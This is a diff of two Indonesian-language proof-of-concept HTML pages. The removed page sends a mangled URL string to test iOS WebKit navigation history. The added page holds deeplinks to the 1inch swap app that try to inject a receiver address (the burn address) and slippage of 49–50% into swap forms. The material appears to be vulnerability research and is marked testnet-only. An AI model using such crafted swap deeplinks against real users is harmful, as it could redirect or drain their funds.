@@ -1,108 +1,35 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit URL Navigation State Test</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-            padding: 20px;
-            text-align: center;
-        }
-        .container {
-            max-width: 100%;
-            margin: 20px auto;
-            background-color: #1e293b;
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            border: 1px solid #334155;
-        }
-        h2 {
-            color: #f87171;
-            font-size: 22px;
-            margin-top: 0;
-        }
-        .payload-box {
-            background-color: #020617;
-            color: #4ade80;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-            margin: 20px 0;
-            border: 1px solid #334155;
-        }
-        .btn {
-            display: block;
-            background-color: #ef4444;
-            color: white;
-            text-decoration: none;
-            border: none;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            margin-bottom: 15px;
-            width: 100%;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .btn-secondary {
-            background-color: #2563eb;
-        }
-        .btn:active {
-            opacity: 0.8;
-        }
-        .instructions {
-            text-align: left;
-            font-size: 13px;
-            color: #94a3b8;
-            line-height: 1.6;
-            margin-top: 25px;
-            background: #0f172a;
-            padding: 15px;
-            border-radius: 8px;
-        }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Test Deeplink 1inch</title>
+  <style>body{font-family:sans-serif;padding:20px} a{display:block;margin:15px 0;padding:15px;background:#111;color:#fff;text-decoration:none;border-radius:10px}</style>
 </head>
 <body>
+  <h2>Test Deeplink Param Injection - 1inch iOS</h2>
+  <p>Ini test di testnet. Jangan pakai mainnet.</p>
 
-<div class="container">
-    <h2>⚠️ iOS WebKit URL State Test</h2>
-    <p>PoC untuk menguji ketahanan manajemen riwayat navigasi pada komponen WebKit iOS terhadap mutasi string URL.</p>
-    
-    <div class="payload-box">
-        -%~-0/~%7%%%~-7a07%EF%BF%BD0.A|
-    </div>
+  <!-- TEST 1: dstReceiver injection -->
+  <a href="https://app.1inch.io/#/1/swap/ETH/USDT?srcAmount=0.001&dstReceiver=0x000000000000000000000000000000000000dEaD&slippage=1">
+    TEST 1: Inject dstReceiver = 0xdead
+  </a>
 
-    <button class="btn" onclick="triggerNavigation()">Picu via window.open()</button>
-    
-    <a class="btn btn-secondary" href="-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|" target="_blank">Picu via Link (&lt;a&gt; tag)</a>
-    
-    <div class="instructions">
-        <strong>Langkah Validasi Masalah (Sesuai Hasil Pengujian):</strong>
-        <ol>
-            <li>Akses halaman ini melalui browser Firefox atau Safari di perangkat iOS.</li>
-            <li>Ketuk salah satu tombol pemicu di atas untuk mengarahkan navigasi ke string URL hasil mutasi.</li>
-            <li>Sistem keamanan anti-phishing iOS akan mencegat URL dan menampilkan layar peringatan merah pada objek <code>about:blank</code>.</li>
-            <li><strong>Indikator Malfungsi:</strong> Perhatikan bilah navigasi bawah browser. Tombol panah kiri (Back) dan kanan (Forward) akan terkunci dan berubah warna menjadi abu-abu (disabled), menandakan rusaknya sinkronisasi status riwayat navigasi (*history stack*).</li>
-        </ol>
-    </div>
-</div>
+  <!-- TEST 2: slippage 50% injection -->
+  <a href="https://app.1inch.io/#/1/swap/ETH/USDT?srcAmount=0.001&slippage=50">
+    TEST 2: Inject slippage 50%
+  </a>
 
-<script>
-    function triggerNavigation() {
-        // Mengirimkan payload ter-encode untuk menguji respon transisi state pada WebKit
-        const payload = "-%~-0/~%7%%%~-7a07%EF%BF%BD0.A|";
-        window.open(payload, "_blank");
-    }
-</script>
+  <!-- TEST 3: Kombinasi full -->
+  <a href="https://app.1inch.io/#/137/swap/MATIC/USDT?srcAmount=0.1&dstReceiver=0x000000000000000000000000000000000000dEaD&slippage=49&dstChain=1">
+    TEST 3: Full param di Polygon (137)
+  </a>
 
+  <p id="log" style="margin-top:30px;background:#f5f5f5;padding:10px;word-break:break-all;"></p>
+
+  <script>
+    // Log current URL params yang ke-detect
+    document.getElementById('log').innerText = "Current URL: " + window.location.href + "\n\nKalau kamu buka link di atas dari dalam 1inch dApp Browser, cek apakah field 'Receive to' atau 'Slippage' otomatis berubah jadi 0xdead / 50% tanpa user edit.";
+  </script>
 </body>
 </html>
